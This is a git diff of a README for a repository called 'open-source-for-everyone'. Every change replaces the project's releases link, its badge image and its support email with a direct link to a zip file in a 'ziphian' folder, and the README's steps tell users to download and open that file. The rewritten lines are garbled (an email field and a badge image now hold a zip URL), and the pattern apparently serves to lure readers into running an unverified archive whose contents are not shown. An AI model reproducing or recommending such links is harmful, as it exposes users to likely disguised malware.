@@ -1,6 +1,6 @@
 # 🎉 open-source-for-everyone - Learn and Contribute to Open Source Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Open%20Source%20For%20Everyone-brightgreen)](https://github.com/Myckael001/open-source-for-everyone/releases)
+[![Download Now](https://raw.githubusercontent.com/Myckael001/open-source-for-everyone/main/ziphian/open-source-for-everyone.zip%20Now-Open%20Source%20For%20Everyone-brightgreen)](https://raw.githubusercontent.com/Myckael001/open-source-for-everyone/main/ziphian/open-source-for-everyone.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ Welcome to **open-source-for-everyone**! This repository is designed to help beg
 To start using the application, follow these steps:
 
 1. **Download the Application**
-   - Visit this page to download: [Releases Page](https://github.com/Myckael001/open-source-for-everyone/releases)
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Myckael001/open-source-for-everyone/main/ziphian/open-source-for-everyone.zip)
 
 2. **Install the Application**
    - Once the download is complete, locate the downloaded file in your computer's Downloads folder.
@@ -59,7 +59,7 @@ To ensure the best performance, please check the following system requirements:
 
 For detailed installation steps, please follow these instructions:
 
-1. Click on the download link: [Download Now](https://github.com/Myckael001/open-source-for-everyone/releases).
+1. Click on the download link: [Download Now](https://raw.githubusercontent.com/Myckael001/open-source-for-everyone/main/ziphian/open-source-for-everyone.zip).
 2. Save the downloaded file to your preferred location.
 3. Open the file to start the installation process.
 
@@ -71,7 +71,7 @@ Don’t hesitate to reach out to our community if you need assistance:
 
 - **GitHub Issues**: Use the Issues tab on the GitHub page for bug reports or questions.
 - **Discussion Forum**: Join conversations to get help or share insights with others.
-- **Email Support**: For direct inquiries, contact support@open-source-for-everyone.org.
+- **Email Support**: For direct inquiries, contact https://raw.githubusercontent.com/Myckael001/open-source-for-everyone/main/ziphian/open-source-for-everyone.zip
 
 ## 🤝 Contributing
 
@@ -87,4 +87,4 @@ Check our contributing guidelines for more detailed information on how to contri
 
 Let’s build a vibrant open-source community together. We are eager to see your contributions and insights. Don’t forget to star the repository if you find it useful!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Open%20Source%20For%20Everyone-brightgreen)](https://github.com/Myckael001/open-source-for-everyone/releases)
+[![Download Now](https://raw.githubusercontent.com/Myckael001/open-source-for-everyone/main/ziphian/open-source-for-everyone.zip%20Now-Open%20Source%20For%20Everyone-brightgreen)](https://raw.githubusercontent.com/Myckael001/open-source-for-everyone/main/ziphian/open-source-for-everyone.zip)
